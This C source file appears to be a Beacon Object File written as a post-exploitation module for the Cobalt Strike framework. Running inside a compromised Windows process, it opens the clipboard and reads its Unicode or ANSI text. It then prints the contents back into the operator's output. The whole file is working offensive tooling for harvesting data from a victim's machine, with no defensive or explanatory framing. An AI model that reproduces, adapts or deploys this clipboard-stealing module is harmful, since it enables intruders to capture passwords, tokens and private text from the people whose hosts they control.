#include <windows.h>
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/bofdefs.h"
#include "../../RemoteOps/CS-Remote-OPs-BOF/src/common/base.c"

#define CF_TEXT          1
#define CF_UNICODETEXT  13

DECLSPEC_IMPORT BOOL   USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT HANDLE USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT BOOL   USER32$CloseClipboard(void);
DECLSPEC_IMPORT BOOL   USER32$IsClipboardFormatAvailable(UINT);
DECLSPEC_IMPORT LPVOID KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT BOOL   KERNEL32$GlobalUnlock(HGLOBAL);

void *memcpy(void *dest, const void *src, size_t n) {
    return MSVCRT$memcpy(dest, src, n);
}

void *memset(void *s, int c, size_t n) {
    MSVCRT$memset(s, c, n);
    return s;
}

void go(char *args, int len) {
    bofstart();

    if (!USER32$OpenClipboard(NULL)) {
        internal_printf("[-] Failed to open clipboard (error %lu)\n", KERNEL32$GetLastError());
        printoutput(TRUE);
        return;
    }

    if (USER32$IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE hData = USER32$GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t *pText = (wchar_t *)KERNEL32$GlobalLock(hData);
            if (pText) {
                char *utf8 = Utf16ToUtf8(pText);
                if (utf8) {
                    internal_printf("[Clipboard Contents]\n%s\n", utf8);
                    intFree(utf8);
                } else {
                    internal_printf("[-] Failed to convert clipboard text to UTF-8\n");
                }
                KERNEL32$GlobalUnlock(hData);
            } else {
                internal_printf("[-] Failed to lock clipboard data\n");
            }
        } else {
            internal_printf("[-] Failed to get clipboard data\n");
        }
    } else if (USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hData = USER32$GetClipboardData(CF_TEXT);
        if (hData) {
            char *pText = (char *)KERNEL32$GlobalLock(hData);
            if (pText) {
                internal_printf("[Clipboard Contents]\n%s\n", pText);
                KERNEL32$GlobalUnlock(hData);
            } else {
                internal_printf("[-] Failed to lock clipboard data\n");
            }
        } else {
            internal_printf("[-] Failed to get clipboard data\n");
        }
    } else {
        internal_printf("[*] Clipboard is empty or contains non-text data\n");
    }

    USER32$CloseClipboard();
    printoutput(TRUE);
}
